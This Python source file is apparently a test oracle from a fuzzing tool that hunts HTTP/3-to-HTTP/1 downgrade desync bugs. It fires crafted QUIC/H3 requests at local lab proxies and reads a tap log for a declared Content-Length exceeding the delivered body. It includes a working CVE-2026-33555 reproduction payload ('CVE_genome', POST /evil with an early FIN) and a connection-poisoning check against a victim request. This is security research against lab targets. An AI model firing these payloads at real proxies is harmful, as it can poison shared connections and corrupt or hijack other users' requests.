"""H3->H1 downgrade desync oracle (tap-based). Fire a genome via real H3 at the edge;
read the tap (edge->origin H1 bytes); a desync = the forwarded request declares a
Content-Length that does NOT match the body bytes actually delivered (the CVE-2026-33555
invariant: declared length != delivered length). Reusable for the hunt. Sentinel:
the CVE genome must fire on vuln (4434) and stay clean on patched (4433)."""
import asyncio, os, ssl, sys, time
sys.path.insert(0, "/home/j4kuuu/Desktop/tools/Phage/src")
from aioquic.asyncio.client import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.quic.configuration import QuicConfiguration
from phage.evo import genome as G
from phage.evo.driver import drive

TAP = os.environ.get("QD_TAP", "logs/tap_eo.jsonl")
CONN = os.environ.get("QD_CONN", "logs/conn_bk.log")  # origin per-request log (REQ lines)
CRLF = b"\r\n"
_victim_n = [0]
# Waits: the request must be fully forwarded to origin before we read the tap delta,
# else an early read sees an empty/partial delta and fabricates a desync. repro_cve
# needed ~1.5s total; keep that as the floor, env-tunable per front.
FIRE_WAIT = float(os.environ.get("QD_FIRE_WAIT", "0.3"))
READ_WAIT = float(os.environ.get("QD_READ_WAIT", "1.2"))


class _NoStreamAdapter(QuicConnectionProtocol):
    """Suppress the base stream adapter whose py3.14 __del__ FINs the request stream
    when a genome awaits mid-stream (the Migrate/KeyUpdate pump). Without this, every
    transport-state genome self-truncates into a FALSE CL>body desync. The oracle must
    read a real server desync, not a client artifact."""

    def quic_event_received(self, event):
        pass


def size(p):
    try: return os.path.getsize(p)
    except OSError: return 0


async def _fire(port, genome, raw):
    cfg = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
    cfg.verify_mode = ssl.CERT_NONE
    async with connect("127.0.0.1", port, configuration=cfg,
                       create_protocol=_NoStreamAdapter) as client:
        from phage.evo.quic_ext import enable_reliable_reset
        enable_reliable_reset(client._quic)  # so ResetStreamAt ops can fire
        http = H3Connection(client._quic)
        sid = client._quic.get_next_available_stream_id()
        await drive(http, client._quic, sid, genome, transmit=client.transmit, raw=raw)
        await asyncio.sleep(FIRE_WAIT)


def _fire_sync(port, genome, raw, timeout=6.0):
    """Run _fire with a hard bound. A poisoned pooling backend (the CVE-2026-33555
    wedge) makes a victim request hang; the bound turns that into a clean timeout so
    the oracle degrades instead of blocking. The request bytes have already reached
    origin by the time a hang occurs, so the conn-log verdict is still valid."""
    try:
        asyncio.new_event_loop().run_until_complete(
            asyncio.wait_for(_fire(port, genome, raw), timeout)
        )
    except Exception:
        pass


def declared_delivered(fwd):
    """(declared CL, delivered body length) for the forwarded request."""
    head, sep, body = fwd.partition(CRLF + CRLF)
    if not sep:
        return None, 0
    cl = None
    for line in head.split(CRLF):
        if line.lower().startswith(b"content-length"):
            try: cl = int(line.split(b":", 1)[1].strip())
            except ValueError: cl = None
    return cl, len(body)


def _read_delta_stable(off, settle=0.25, timeout=None):
    """Read the tap delta deterministically: poll until it is non-empty AND has stopped
    growing for `settle` seconds (or `timeout` elapses). A fixed sleep-then-read races the
    forward and fabricates empty/partial deltas; this quiesces first."""
    timeout = READ_WAIT * 3 if timeout is None else timeout
    deadline = time.monotonic() + timeout
    last = -1
    stable_since = None
    while time.monotonic() < deadline:
        cur = size(TAP)
        grew = cur - off
        if grew > 0 and cur == last:
            if stable_since is None:
                stable_since = time.monotonic()
            elif time.monotonic() - stable_since >= settle:
                break
        else:
            stable_since = None
        last = cur
        time.sleep(0.05)
    try:
        with open(TAP, "rb") as f:
            f.seek(off)
            return f.read()
    except OSError:
        return b""


def probe(port, genome, raw=True):
    off = size(TAP)
    _fire_sync(port, genome, raw)
    fwd = _read_delta_stable(off)
    cl, body = declared_delivered(fwd)
    desync = cl is not None and cl > body
    return dict(fwd_len=len(fwd), cl=cl, body=body, desync=desync,
                rl=fwd.split(CRLF, 1)[0][:50])


def poison_probe(port, genome, raw=True):
    """Impact oracle. A forwarded cl>body is only SMUGGLING if the downgrader reuses the
    poisoned upstream connection for the next request, eating its leading bytes
    (CVE-2026-33555). Fire `genome`, then a uniquely-marked victim, and check whether the
    victim's request-line reaches the origin (QD_CONN log) CLEANLY. Distinguishes a real
    poison from a benign truncation the front forwards but does not reuse (e.g. Caddy,
    where Go's transport closes the truncated conn). Returns dict with cl_lie (the tap
    signal) and poisoned (the impact signal)."""
    r = probe(port, genome, raw=raw)  # the framing forward: does the front send cl>body?
    _victim_n[0] += 1
    vpath = f"/vic-{_victim_n[0]}".encode()
    off = size(CONN)
    victim = [
        Headers_cl(vpath, 4),
        G.Data(b"WXYZ", end_stream=True),
    ]
    _fire_sync(port, victim, raw)
    time.sleep(READ_WAIT)
    try:
        with open(CONN, "rb") as f:
            f.seek(off)
            delta = f.read()
    except OSError:
        delta = b""
    victim_clean = (b"POST " + vpath + b" HTTP/1.1") in delta
    return dict(cl_lie=r["desync"], cl=r["cl"], body=r["body"],
                victim_clean=victim_clean, poisoned=(r["desync"] and not victim_clean))


def Headers_cl(path, cl):
    return G.Headers(((b":method", b"POST"), (b":scheme", b"https"),
                     (b":authority", b"lab"), (b":path", path),
                     (b"content-length", str(cl).encode())), end_stream=False)


def CVE_genome(cl=10):
    return [G.Headers(((b":method", b"POST"), (b":scheme", b"https"),
                       (b":authority", b"lab"), (b":path", b"/evil"),
                       (b"content-length", str(cl).encode())), end_stream=False),
            G.Fin()]


if __name__ == "__main__":
    print("SENTINEL: can a Phage GENOME reproduce CVE-2026-33555 via the driver?")
    print("  benign (seed_post) vuln  :", probe(4434, G.seed_post(body=b"AAAA")))
    print("  CVE-genome        vuln   :", probe(4434, CVE_genome(10)))
    print("  CVE-genome        PATCHED:", probe(4433, CVE_genome(10)))
